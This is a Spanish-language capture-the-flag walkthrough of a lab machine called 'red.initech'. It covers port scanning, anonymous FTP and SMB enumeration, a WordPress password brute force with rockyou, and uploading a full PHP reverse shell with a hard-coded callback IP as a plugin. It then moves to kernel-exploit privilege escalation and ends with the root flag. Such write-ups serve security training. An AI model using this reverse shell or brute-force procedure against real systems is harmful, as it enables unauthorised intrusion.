
# Arp-scan / netdiscover / nmap /fping
```css
arp-scan -l
192.168.6.134	08:00:27:f1:ad:ae	PCS Systemtechnik GmbH
```

# Ping
```css
--- 192.168.6.134 ping statistics ---
2 packets transmitted, 0 received, 100% packet loss, time 1063ms
```
se puede ver que el ping no sirve.ss
# Nmap
```css
   1 │ # Nmap 7.95 scan initiated Fri Sep  4 11:15:28 2026 as: nmap -sS -p- --open -Pn -n -vvv --min-rate 5000 -oN synscan.nmap 192.168.6.134
   2 │ Nmap scan report for 192.168.6.134
   3 │ Host is up, received arp-response (0.00055s latency).
   4 │ Scanned at 2026-09-04 11:15:28 -04 for 26s
   5 │ Not shown: 65523 filtered tcp ports (no-response), 4 closed tcp ports (reset)
   6 │ Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
   7 │ PORT      STATE SERVICE     REASON
   8 │ 21/tcp    open  ftp         syn-ack ttl 64
   9 │ 22/tcp    open  ssh         syn-ack ttl 64
  10 │ 53/tcp    open  domain      syn-ack ttl 64
  11 │ 80/tcp    open  http        syn-ack ttl 64
  12 │ 139/tcp   open  netbios-ssn syn-ack ttl 64
  13 │ 666/tcp   open  doom        syn-ack ttl 64
  14 │ 3306/tcp  open  mysql       syn-ack ttl 64
  15 │ 12380/tcp open  unknown     syn-ack ttl 64
```
## Servicios y puertos abiertos
```css
-->21/tcp    open  ftp
-->22/tcp    open  ssh 
-->53/tcp    open  domain
-->80/tcp    open  http  
-->139/tcp   open  netbios-ssn
-->666/tcp   open  doom 
-->3306/tcp  open  mysql
-->12380/tcp open  unknown
```
# Whatweb
```css
whatweb 192.168.6.134
http://192.168.6.134 [404 Not Found] Country[RESERVED][ZZ], HTML5, IP[192.168.6.134], Title[404 Not Found]
```


### Servicios y puertos abiertos
```css
PORT      STATE  SERVICE     REASON         VERSION
21/tcp    open   ftp         syn-ack ttl 64 vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.6.131
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open   ssh         syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDc/xrBbi5hixT2B19dQilbbrCaRllRyNhtJcOzE8x0BM1ow9I80RcU7DtajyqiXXEwHRavQdO+/cHZMyOiMFZG59OCuIouLRNoVO58C91gzDgDZ1fKH6BDg+FaSz+iYZbHg2lzaMPbRje6oqNamPR4QGISNUpxZeAsQTLIiPcRlb5agwurovTd3p0SXe0GknFhZwHHvAZWa2J6lHE2b9K5IsSsDzX2WHQ4vPb+1DzDHV0RTRVUGviFvUX1X5tVFvVZy0TTFc0minD75CYClxLrgc+wFLPcAmE2C030ER/Z+9umbhuhCnLkLN87hlzDSRDPwUjWr+sNA3+7vc/xuZul
|   256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNQB5n5kAZPIyHb9lVx1aU0fyOXMPUblpmB8DRjnP8tVIafLIWh54wmTFVd3nCMr1n5IRWiFeX1weTBDSjjz0IY=
|   256 6d:01:b7:73:ac:b0:93:6f:fa:b9:89:e6:ae:3c:ab:d3 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ9wvrF4tkFMApswOmWKpTymFjkaiIoie4QD0RWOYnny
53/tcp    open   domain      syn-ack ttl 64 dnsmasq 2.75
| dns-nsid: 
|   NSID: \x1F (1f)
|_  bind.version: dnsmasq-2.75
80/tcp    open   http        syn-ack ttl 64 PHP cli server 5.5 or later
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: 404 Not Found
139/tcp   open   netbios-ssn syn-ack ttl 64 Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
666/tcp   closed doom        reset ttl 64
3306/tcp  open   mysql       syn-ack ttl 64 MySQL 5.7.12-0ubuntu1
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.12-0ubuntu1
|   Thread ID: 9
|   Capabilities flags: 63487
|   Some Capabilities: SupportsCompression, Support41Auth, SupportsLoadDataLocal, Speaks41ProtocolOld, Speaks41ProtocolNew, InteractiveClient, IgnoreSigpipes, IgnoreSpaceBeforeParenthesis, SupportsTransactions, LongPassword, ConnectWithDatabase, ODBCClient, DontAllowDatabaseTableColumn, LongColumnFlag, FoundRows, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: %>q+G\x10DG7\x18A4GU/rJ	'\x19
|_  Auth Plugin Name: mysql_native_password
12380/tcp open   http        syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Tim, we need to-do better next year for Initech
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
MAC Address: 08:00:27:F1:AD:AE (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -19m59s, deviation: 34m37s, median: 0s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)
|   Computer name: red
|   NetBIOS computer name: RED\x00
|   Domain name: \x00
|   FQDN: red
|_  System time: 2026-09-04T16:17:28+01:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-09-04T15:17:28
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 14184/tcp): CLEAN (Timeout)
|   Check 2 (port 33355/tcp): CLEAN (Timeout)
|   Check 3 (port 23429/udp): CLEAN (Failed to receive data)
|   Check 4 (port 30673/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| nbstat: NetBIOS name: RED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   RED<00>              Flags: <unique><active>
|   RED<03>              Flags: <unique><active>
|   RED<20>              Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```


# Port 21
```css
Name (192.168.6.134:jjaguero): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
550 Permission denied.
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             107 Jun 03  2016 note
226 Directory send OK.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jun 04  2016 .
drwxr-xr-x    2 0        0            4096 Jun 04  2016 ..
-rw-r--r--    1 0        0             107 Jun 03  2016 note
226 Directory send OK.
ftp> get note
local: note remote: note
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note (107 bytes).
```

se puede ver que hay una nota en el servicio ftp con el siguiente contenido
```
Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.
```

Con esta informacion nos dan dos posibles usuarios, John, Elly
# SMB
se puede ver que en el smb aunque no este abierto, se puede ver que uno se puede conectar como usuario invitado vamos a ver que pasa ahi


![](./images/Pasted%20image%2020260905172207.png)

vemos extrañamente que el disk de kathy tiene un interesante mensaje, que dice que haces aqui vamos a echar un vistazo a eso primero que todo vamos a ver dentro de la carpeta de kathy donde se puede ver lo siguiente

![](./images/Pasted%20image%2020260905172656.png)

continuando checkearemos el contenido de tmp para ver los archivos temporales:
![](./images/Pasted%20image%2020260905172726.png)

a continuacion con esto vamos a sacar la informacion que tenemos y la exploraremos
```css
smbclient '\\192.168.6.134\tmp' -N -c 'prompt OFF;recurse ON; mget *'
smbclient '\\192.168.6.134\kathy' -N -c 'prompt OFF;recurse ON; mget *'

```
en kathy stuff vemos un archivo txt llamada todo-list.txt con la siguiente informacion:

```css
I'm making sure to backup anything important for Initech, Kathy
```

en la carpeta backup vemos lo siguiente

![](./images/Pasted%20image%2020260905174312.png)

vemos un wordpress que se estrajo esto da acceso a una pagina hecha en wordpress, aun no voy a revisar bien y tambien hay una configuracion de ftp, validando que el usuario anonymous si existe y se puede usar.


# Port 80

el puerto 80 redirige a un http sin nada, es algo raro


# Port 12380

en este puerto encontramos la verdadera pagina de la aplicacion
![](./images/Pasted%20image%2020260905174959.png)

Con la siguiente informacion, se puede ver un mensaje, esto es una plantilla de bootstrap en la parte de abajo dice  Free Download here que al clickear nos redirije a la pagina de la plantilla

![](./images/Pasted%20image%2020260905175122.png)


veo que no hay nada relevante en la pagina, no encontre nada intente fuzzear nada hasta que cambie el certificado a https y ocurrio lo siguiente:

![](./images/Pasted%20image%2020260905183816.png)

hay una pagina y ya cambio la cosa.
voy a escanear la web con nikto para averiguar si existen directorios:

![](./images/Pasted%20image%2020260905184158.png)


se ve que encontro expuesto un archivo llamado robots.txt y un phpmyadmin, tambien que el dominio se llama red.initech

lo asignamos en el etc/hosts

en robots.txt vemos lo siguiente
```css
User-agent: *
Disallow: /admin112233/
Disallow: /blogblog/

```

dos paginas webs encontrada, vamos a acceder a blogblog ya que admin112233 es un xss

dentro de aca en el apartado de login encontramos un wordpress
![](./images/Pasted%20image%2020260905184558.png)

![](./images/Pasted%20image%2020260905184607.png)



un panel de login lo que vamos a hacer aca es intentar analizar lo que hay dentro de la pagina wspcan
```css
wpscan --url https://192.168.6.134:12380/blogblog/ -e u --disable-tls-checks

```



```css
[+] URL: https://192.168.6.134:12380/blogblog/ [192.168.6.134]
[+] Started: Sat Sep  5 18:50:47 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.18 (Ubuntu)
 |  - Dave: Soemthing doesn't look right here
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: https://192.168.6.134:12380/blogblog/xmlrpc.php
 | Found By: Headers (Passive Detection)
 | Confidence: 100%
 | Confirmed By:
 |  - Link Tag (Passive Detection), 30% confidence
 |  - Direct Access (Aggressive Detection), 100% confidence
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: https://192.168.6.134:12380/blogblog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Registration is enabled: https://192.168.6.134:12380/blogblog/wp-login.php?action=register
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: https://192.168.6.134:12380/blogblog/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: https://192.168.6.134:12380/blogblog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.2.1 identified (Insecure, released on 2015-04-27).
 | Found By: Rss Generator (Passive Detection)
 |  - https://192.168.6.134:12380/blogblog/?feed=rss2, <generator>http://wordpress.org/?v=4.2.1</generator>
 |  - https://192.168.6.134:12380/blogblog/?feed=comments-rss2, <generator>http://wordpress.org/?v=4.2.1</generator>

[+] WordPress theme in use: bhost
 | Location: https://192.168.6.134:12380/blogblog/wp-content/themes/bhost/
 | Last Updated: 2026-02-26T00:00:00.000Z
 | Readme: https://192.168.6.134:12380/blogblog/wp-content/themes/bhost/readme.txt
 | [!] The version is out of date, the latest version is 2.3
 | Style URL: https://192.168.6.134:12380/blogblog/wp-content/themes/bhost/style.css?ver=4.2.1
 | Style Name: BHost
 | Description: Bhost is a nice , clean , beautifull, Responsive and modern design free WordPress Theme. This theme ...
 | Author: Masum Billah
 | Author URI: http://getmasum.net/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2.9 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://192.168.6.134:12380/blogblog/wp-content/themes/bhost/style.css?ver=4.2.1, Match: 'Version: 1.2.9'

[+] Enumerating Users (via Passive and Aggressive Methods)

```
![](./images/Pasted%20image%2020260905185155.png)

y unas rutas aparte en este caso esta habilitada la ruta de wp-content/uploads esto es importante:

intentare fuerza bruta con el usuario john:

```css
wpscan --url https://192.168.6.134:12380/blogblog --disable-tls-checks -U john -P /usr/share/wordlists/rockyou.txt --password-attack wp-login
```
usando un diccionario llamado rockyou.txt con mas de 14 millones de parametros
despues de dejar un largo rato el wordpress haciendo fuerza bruta encontramos que la contraseña del usuario john es incorrect.

al entrar con el usuario john tenemos un wordpress:

![](./images/Pasted%20image%2020260905190924.png)


de todas las opciones tenemos el de instalar un plugin y cargarlo en wp content:


### Exploit modified
```css
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.6.131';
$port = 8000;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```
### Explication of the exploit
```css
revshell de pentest monkey php
```


![](./images/Pasted%20image%2020260905191259.png)

instalamos el exploit al darle instalar sale lo siguiente:

![](./images/Pasted%20image%2020260905191345.png)

aca es donde entra el archivo de configuracion ftp que encontramos en el SMB

![](./images/Pasted%20image%2020260905191557.png)

rellanado de campos:

Hostname: Localhost
FTP Username: anonymous
FTP Pass: incorrect

se sube el archivo a /wp-content/uploads
clickeando en shell.php ya accedemos a la maquina:

![](./images/Pasted%20image%2020260905191848.png)

# Enumeración básica sistema
```css
www-data@red:/tmp$ uname -a
Linux red.initech 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux
```
# Permisos sudo
```css

```
# Permisos SUID
```css

```
# Tareas cron
```css

```


Antes de todo ya accedimos a la maquina como www-data pero hay que hacer tratamiento de tty

realmente la escalada de privilegios la queria hacer sencilla con un exploit sabiendo que la version de Linux es la 4.4.0-21 busque un exploit de escalada de privilegios

descargue un script donde detecta que exploit se pueden usar y fui probandolos


```css
wget --no-check-certificate https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh

chmod +x les.sh
```


![](./images/Pasted%20image%2020260905203309.png)

este exploit lo instale y lo ejecute

![](Stapler1/images/Pasted%20image%2020260905203403.png)

una vez en usuario root busque la flag:

![](./images/Pasted%20image%2020260905203429.png)


```
b6b545dc11b7a270f4bad23432190c75162c4a2b
```